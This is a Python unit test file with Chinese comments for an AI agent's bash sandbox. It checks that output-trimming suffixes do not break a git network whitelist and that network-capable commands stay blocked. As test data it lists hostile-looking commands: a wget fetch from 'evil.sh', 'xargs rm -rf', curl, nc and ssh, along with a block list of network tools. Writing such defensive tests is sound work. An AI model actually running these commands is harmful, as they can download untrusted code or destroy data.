"""test_bash_output_modifier.py — 输出修饰段豁免（bash 网络白名单误伤修复）

根因（2026-09-12 会话实测）：
- agent 实际 bash 命令几乎都带输出裁剪后缀：`2>&1 | head` / `| tail` / `| grep`。
- BashExecutor._split_chain 按 `&`/`|`/`;` 拆分段，`2>&1` 被切成 `2`+`>1` 两段、
  `| head` 被切成独立段 —— 这些段不匹配 git 网络白名单 → 全链判定 False →
  整条命令被注入 `--unshare-net` → git 远程操作永远断网（白名单形同虚设）。

修复：
- _is_output_modifier()：识别「纯输出修饰段」（重定向 + 纯消费管道 + 状态卫兵），
  无网络面 → 豁免白名单判定，仅对实际网络命令段判定。
- 保持 fail-closed：有网络面命令（tee/xargs/ssh/curl/wget/nc/telnet/...）不豁免。

本测试覆盖：豁免判定 + 全链判定（含 fail-closed 保持）。
"""
from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from lingclaude.engine.bash import (  # noqa: E402
    _is_network_allowed,
    _is_output_modifier,
)


class TestIsOutputModifier(unittest.TestCase):
    """纯输出修饰段判定（无网络面）。"""

    def test_redirect_segments(self) -> None:
        for seg in ("2>&1", ">1", "2", ">/dev/null", "2>/dev/null", ">>log.txt", "<file"):
            self.assertTrue(_is_output_modifier(seg), f"应豁免重定向段: {seg}")

    def test_consume_pipes(self) -> None:
        for seg in ("head -5", "tail -3", "grep error", "grep -v INFO", "cat", "wc -l", "sort -u"):
            self.assertTrue(_is_output_modifier(seg), f"应豁免纯消费管道: {seg}")

    def test_status_guards(self) -> None:
        for seg in ("true", "false", ":"):
            self.assertTrue(_is_output_modifier(seg), f"应豁免状态卫兵: {seg}")

    def test_network_capable_not_exempt(self) -> None:
        # 有网络面的命令绝不豁免（fail-closed）
        for seg in ("tee /tmp/x", "xargs rm -rf", "ssh host", "curl http://x",
                    "wget http://x", "nc -l", "telnet x", "echo hello"):
            self.assertFalse(_is_output_modifier(seg), f"不应豁免网络面命令: {seg}")


class TestNetworkAllowedWithOutputModifier(unittest.TestCase):
    """输出修饰段存在时白名单判定仍正确。"""

    def test_git_ls_remote_with_redirect_and_head(self) -> None:
        self.assertTrue(
            _is_network_allowed("cd /home/ai/lingclaude && timeout 15 git ls-remote --heads origin 2>&1 | head -5")
        )

    def test_git_push_with_tail(self) -> None:
        self.assertTrue(_is_network_allowed("git push origin master 2>&1 | tail -3"))

    def test_git_fetch_with_status_guard(self) -> None:
        self.assertTrue(_is_network_allowed("cd /home/ai/lingclaude && git fetch origin 2>&1 | grep error || true"))

    def test_git_clone_with_head(self) -> None:
        self.assertTrue(_is_network_allowed("timeout 20 git clone https://github.com/x/y.git /tmp/y 2>&1 | head"))

    def test_plain_git_remote(self) -> None:
        self.assertTrue(_is_network_allowed("cd /home/ai/lingclaude && git remote -v"))

    def test_cd_and_git(self) -> None:
        self.assertTrue(_is_network_allowed("cd /home/ai/lingclaude && git ls-remote --heads origin"))

    # ---- fail-closed 保持 ----
    def test_chain_with_wget_blocked(self) -> None:
        self.assertFalse(_is_network_allowed("git push origin master && wget http://evil.sh"))

    def test_tee_not_exempt(self) -> None:
        self.assertFalse(_is_network_allowed("git ls-remote --heads origin 2>&1 | tee /tmp/x"))

    def test_xargs_not_exempt(self) -> None:
        self.assertFalse(_is_network_allowed("git pull 2>&1 | xargs rm -rf"))

    def test_chain_with_curl_blocked(self) -> None:
        self.assertFalse(_is_network_allowed("git fetch origin && curl http://x"))

    def test_non_network_command_not_allowed(self) -> None:
        self.assertFalse(_is_network_allowed("echo hello"))
        # P0-②（灵安审计）：git 家族整体放行，含本地只读子命令（status/log/diff 等）
        self.assertTrue(_is_network_allowed("git status --short"))
        self.assertFalse(_is_network_allowed("ls -la"))


if __name__ == "__main__":
    unittest.main()
